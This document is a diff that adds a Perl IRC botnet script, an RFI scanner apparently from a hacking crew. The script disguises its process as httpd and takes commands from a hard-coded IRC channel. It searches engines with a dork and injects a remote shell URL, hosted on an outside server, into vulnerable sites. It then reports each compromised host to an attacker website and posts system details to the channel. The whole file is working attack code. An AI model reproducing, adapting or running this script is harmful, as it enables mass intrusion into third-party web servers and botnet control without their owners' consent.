@@ -1,0 +1,355 @@
+﻿#!/usr/bin/perl 
+#  powered by alboss paradise @
+#  irc.ascnet.biz ; irc.fier1.com ; irc.securityfuckus.com
+#  www.xshqiptaretx.org
+
+use IO::Socket::INET; 
+use HTTP::Request; 
+use LWP::UserAgent;
+my $processo = "httpd -SascSL"; 
+if (`ps aux` =~ /httpd -SascSL/){exit;}        
+my $cmd="http://zerottino.helloweb.eu/dow/idasc"; 
+my $server="67.19.105.42"; 
+my $porta="6667"; 
+my $nick="AlB|Scan|".int(rand(1000))."";
+my $canale="#r0x"; 
+my $password="r0x";
+my $server2=""; 
+my $port2="";
+my $verbot="6.9"; 
+$0="$processo"."\0"x16; 
+my $pid=fork; 
+exit if $pid; 
+die "Problem with fork!: $!" unless defined($pid);
+my $sk = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server", PeerPort=>"$porta",) or die "Cannot connect to server!\n"; 
+$sk->autoflush(1); 
+print $sk "NICK $nick\r\n"; 
+print $sk "USER ASC X * :4,r0x : ALBANIAN.SECURITY.CLAN\r\n"; 
+print $sk "JOIN $canale $password\n";
+print $sk "PRIVMSG $canale :4 .:: [4,1SHELLS ( RFI ) SCANNER STARTED] 9,1 !!! rfi IS ON !!!4 ::.\r\n";
+print $sk "PRIVMSG $canale :4 .:: 9,1!!! /join #r0x FOR !help ON !!!4 ::.\r\n";
+while($line = <$sk>){
+print $line;
+$line =~ s/\r\n$//;
+if ($line=~ /^PING \:(.*)/){
+print "PONG :$1";
+print $sk "PONG :$1\r\n";}
+if ($line =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
+if ($args =~ /^\001VERSION\001$/) {
+stampa($sk, "NOTICE $pn :\001VERSION XChat 2.6.7 by ALBANIA\001");}}
+if ($line =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+print $sk "JOIN $canale\r\n";}
+if ($line=~ /PRIVMSG $canale :.help/){ 
+stampa($sk, "PRIVMSG $canale :11.:: 9[3HELP9] 11/join 10#---- 11FOR 10!help 11::.");}
+if ($line=~ /PRIVMSG $canale :.info/){ 
+my $sysos = `uname -sr`; 
+my $uptime = `uptime`; 
+if ($sysos =~ /freebsd/i ) { 
+$sysname = `hostname`; 
+$memory = `expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`;  
+$swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`; 
+chomp($memory); 
+chomp($swap);} 
+elsif ( $sysos =~ /linux/i ) { 
+$sysname = `hostname -f`; 
+$memory = `free -m |grep -i mem | awk '{print \$2}'`; 
+$swap = `free -m |grep -i swap | awk '{print \$2}'`; 
+chomp($swap); 
+chomp($memory);} 
+else { 
+$sysname ="No Found";;  
+$memory ="No found"; 
+$swap ="No Found";} 
+$uptime=~s/\n//g; 
+$sysname=~s/\n//g; 
+$sysos=~s/\n//g; 
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Info9] 11IrcServer10/Port: 8 $server2 - $port2 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Info9] 11Os10/Hostname:8 $sysos - $sysname 11 ::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Info9] 11Process10/PID:8 $processo - $$ 11 ::."); 
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Info9] 11Uptime:8 $uptime 11 ::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Info9] 11Memory10/Swap:8 $memory - $swap 11 ::."); 
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Info9] 11Perl10/Bot 11Version:8 $] - $verbot 11 ::.");} 
+if ($line=~ /PRIVMSG $canale :!argquit/){
+stampa($sk, "QUIT");
+}
+if ($line=~ /PRIVMSG $canale :.scan\s+(.*?)\s+(.*)/){ 
+if (my $pid = fork) { 
+waitpid($pid, 0); 
+} else { 
+if (fork) { 
+exit; 
+} else { 
+my $bug=$1; 
+my $dork=$2; 
+if ($bug =~ /=/) {} 
+else { 
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3GAY/9LAMMER3/NOOB/BIBA9] 11DETECTED, 10U AREN'T 11ALOWEED 10TO 11SCANN 10ANYMORE 11OK 1u 11don't 10know... 11::.");exit;}
+my $contatore=0; 
+my ($type,$space); 
+my %hosts; 
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3String(9s3)9] 12$dork 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: 9[3Path] 12$bug 11::.");  
+my @glist=&google($dork); 
+my @mlist=&msn($dork); 
+my @alist=&altavista($dork); 
+my @uollist=&uol($dork); 
+my @asklist=&ask($dork); 
+my @ylist=&yahoo($dork); 
+my @altlist=&alltheweb($dork);
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11Ok 10founds 11sites 10for 9[3String(9s3)] 8$dork 11::."); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11Google 10 ".scalar(@glist)." Sites!11::."); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11MsN 10 ".scalar(@mlist)." Sites!11::."); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11Altavista 10 ".scalar(@alist)." Sites!11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11AllTheWeb 10 ".scalar(@altlist)." Sites!11::.");
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11UoL 10 ".scalar(@uollist)." Sites!11::."); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11Yahoo 10 ".scalar(@ylist)." Sites!11::.");; 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 11AsK 10 ".scalar(@asklist)." Sites!11::.");  
+push(my @tot,@glist,@mlist,@uollist,@aollist,@asklist,@altlist,@ylist); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 10We got a totales of 9 ".scalar(@tot)." 10Sites! 11::."); 
+my @puliti=&unici(@tot); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3Searchers9] 10Cleaned Websites Founds 9 ".scalar(@puliti)." 10Sites! 11::."); 
+my $uni=scalar(@puliti);  
+foreach my $sito (@puliti){ 
+$contatore++; 
+if ($contatore %100==0){} 
+if ($contatore==$uni-1){
+stampa($sk, "PRIVMSG $canale :11.:: 9[3.. #pr1v8 rfi scanner...9] 11Scann 10Finished 11For 10[String(s)] 8$dork 11::.");
+stampa($sk, "PRIVMSG $canale :11#ArG0_t34m# (> $server2 <)");} 
+my $test="http://".$sito.$bug.$cmd."????"; 
+my $print="http://".$sito.$bug."http://gujewear.com/bemarket/goods/qmono/Q-MoNoR6.txt"."???"; 
+my $req=HTTP::Request->new(GET=>$test); 
+my $ua=LWP::UserAgent->new(); 
+$ua->timeout(5); 
+my $response=$ua->request($req); 
+if ($response->is_success) { 
+my $re=$response->content; 
+if($re =~ /ALBANIA/ && $re =~ /uid=/){ 
+my $punked="http://www.xshqiptaretx.org/list/index.php?off=$test";
+my $poster=HTTP::Request->new(GET=>$punked);
+my $resa=$ua->request($poster);
+my $hs=geths($print); $hosts{$hs}++; 
+if($hosts{$hs}=="1"){ 
+$x=os($test);
+stampa($sk, "PRIVMSG $canale :11 .::9[3SafeMode9] 9(14 OFF 9) 14$print 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3uname -a9] 9( 14 $alb 9 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3uptime9]  9( 14 $alb2 9 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3id9]  9( 14 $alb3 9 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3pwd9]  9( 14 $alb4 9 ) 11::.");   
+stampa($sk, "PRIVMSG $canale :11 .::9[3user9]  9( 14 $alb9 9 ) 11::."); 
+stampa($sk, "PRIVMSG $canale :11 .::9[3phpv9]  9( 14 $alb6 9 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3SoftWare9]  9( 14 $alb5 9 ) 11::.");
+stampa($sk, "PRIVMSG $canale :11 .::9[3ServerAddr9]  9( 14 $alb7 9 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .::9[3ServerName9]  9( 14 $alb8 9 ) 11::.");}} 
+elsif($re =~ /ALBANIA/){
+my $punked1="http://www.xshqiptaretx.org/list/index.php?on=$test";
+my $poster1=HTTP::Request->new(GET=>$punked1);
+my $resa=$ua->request($poster1);
+my $hs=geths($print); $hosts{$hs}++; 
+if($hosts{$hs}=="1"){ 
+$x=os($test);
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1SafeMode] (12 ON )12 $print 11::.");
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1uname -a] (12$alb ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1uptime] (12$alb2 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1id] (12$alb3 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1pwd] (12$alb4 ) 11::.");
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1user] (12$alb9 ) 11::.");    
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1phpv] (12$alb6 ) 11::."); 
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1SoftWare] (12$alb5 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1ServerAddr] (12$alb7 ) 11::.");  
+stampa($sk, "PRIVMSG $canale :11 .:: [4,1ServerName] (12$alb8 ) 11::.");
+}}}}}exit;}}} 
+sub stampa() { 
+if ($#_ == '1') { 
+my $sk = $_[0]; 
+print $sk "$_[1]\n"; 
+} else { 
+print $sk "$_[0]\n";}} 
+sub os(){ 
+my $sito=$_[0]; 
+my $Res=query($sito);  
+while($Res=~m/<br>uname -a:(.+?)\<br>/g){
+$alb=$1;}
+while($Res=~m/<br>uptime:(.+?)\<br>/g){
+$alb2=$1;}
+while($Res=~m/<br>id:(.+?)\<br>/g){
+$alb3=$1;}
+while($Res=~m/<br>pwd:(.+?)\<br>/g){
+$alb4=$1;}
+while($Res=~m/<br>user:(.+?)\<br>/g){
+$alb9=$1;}
+while($Res=~m/<br>phpv:(.+?)\<br>/g){
+$alb6=$1;}
+while($Res=~m/<br>SoftWare:(.+?)\<br>/g){
+$alb5=$1;}
+while($Res=~m/<br>ServerAddr:(.+?)\<br>/g){
+$alb7=$1;}
+while($Res=~m/<br>ServerName:(.+?)\<br>/g){
+$alb8=$1;}
+sub google(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=0;$b<=2000;$b+=100){ 
+my $Go=("http://www.google.co.uk/search?hl=en&q=".key($key)."&btnG=&meta=&num=100&filter=0&start=".$b); 
+my $Res=query($Go); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if ($1 !~ /google/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}} 
+return @lst;} 
+sub altavista(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b); 
+my $Res=query($AlT); 
+while($Res=~m/<span class=ngrn>(.+?)\//g){ 
+if($1 !~ /altavista/){ 
+my $k=$1; 
+$k=~s/<//g; 
+$k=~s/ //g; 
+my @grep=links($k); 
+push(@lst,@grep);}}
+if ($Res =~ /target=\"_self\">Succ/){}
+else{return @lst;}} 
+return @lst;}
+sub yahoo(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b); 
+my $Res=query($Ya); 
+while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
+my $k=$1; 
+$k=~s/<b>//g; 
+$k=~s/<\/b>//g; 
+$k=~s/<wbr>//g; 
+my @grep=links($k); 
+push(@lst,@grep);}} 
+return @lst;} 
+sub alltheweb(){ 
+my @lst; 
+my $key=$_[0]; 
+my $i=0; 
+my $pg=0; 
+for($i=0; $i<=2000;$i+=100){
+my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i); 
+my $Res=query($all); 
+while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){ 
+my $k=$1; 
+$k=~s/ //g; 
+my @grep=links($k); 
+push(@lst,@grep);}} 
+return @lst;} 
+sub lycos(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $LyCoS=("http://search.lycos.com/?query=".key($key)."&page=".$i); 
+my $Res=query($LyCoS); 
+while ($Res=~ m/<span class=\"?grnLnk small\"?>http:\/\/(.+?)\//g ){
+my $k=$1; 
+if($k!~/busca|lycos|yahoo/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}} 
+return @lst;} 
+sub msn(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE"); 
+my $Res=query($MsN); 
+while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 
+if($1 !~ /msn|live/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}
+if ($Res =~ /nextPage disabled/)
+{return @lst;}}
+return @lst;} 
+sub ask(){ 
+my @lst; 
+my $key=$_[0]; 
+my $i=0; 
+my $pg=0; 
+for($i=0; $i<=2000;$i+=100){ 
+my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all"); 
+my $Res=query($Ask); 
+while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){ 
+my $k=$3;
+$k=~s/[\"\ ]//g; 
+my @grep=links($k); 
+push(@lst,@grep);}} 
+return @lst;}
+sub uol(){ 
+my @lst; 
+my $key = $_[0]; 
+for($b=1;$b<=2000;$b+=100){ 
+my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i); 
+my $Res=query($UoL); 
+while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){ 
+my $k=$1; 
+if($k!~/busca|uol|yahoo/){ 
+my $k=$1; 
+my @grep=links($k); 
+push(@lst,@grep);}}} 
+return @lst;}  
+sub links(){ 
+my @l; 
+my $link=$_[0]; 
+my $host=$_[0]; 
+my $hdir=$_[0]; 
+$hdir=~s/(.*)\/[^\/]*$/\1/; 
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 
+$host.="/"; 
+$link.="/"; 
+$hdir.="/"; 
+$host=~s/\/\//\//g; 
+$hdir=~s/\/\//\//g; 
+$link=~s/\/\//\//g; 
+push(@l,$link,$host,$hdir); 
+return @l;} 
+sub geths(){ 
+my $host=$_[0]; 
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 
+return $host;} 
+sub key(){ 
+my $chiave=$_[0]; 
+$chiave =~ s/ /\+/g; 
+$chiave =~ s/:/\%3A/g; 
+$chiave =~ s/\//\%2F/g; 
+$chiave =~ s/&/\%26/g; 
+$chiave =~ s/\"/\%22/g; 
+$chiave =~ s/,/\%2C/g; 
+$chiave =~ s/\\/\%5C/g; 
+return $chiave;} 
+sub query($){ 
+my $url=$_[0]; 
+$url=~s/http:\/\///; 
+my $host=$url; 
+my $query=$url; 
+my $page=""; 
+$host=~s/href=\"?http:\/\///; 
+$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 
+$query=~s/$host//; 
+if ($query eq "") {$query="/";}; 
+eval{ 
+my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return; 
+print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 
+my @r = <$sock>; 
+$page="@r"; 
+close($sock);}; 
+return $page;} 
+sub unici{ 
+my @unici = (); 
+my %visti = (); 
+foreach my $elemento ( @_ ){ 
+next if $visti{ $elemento }++; 
+push @unici, $elemento;}    
+return @unici;}}
+
+#  powered by alboss paradise @
+#  irc.ascnet.biz ; irc.fier1.com ; irc.securityfuckus.com
+#  www.xshqiptaretx.org
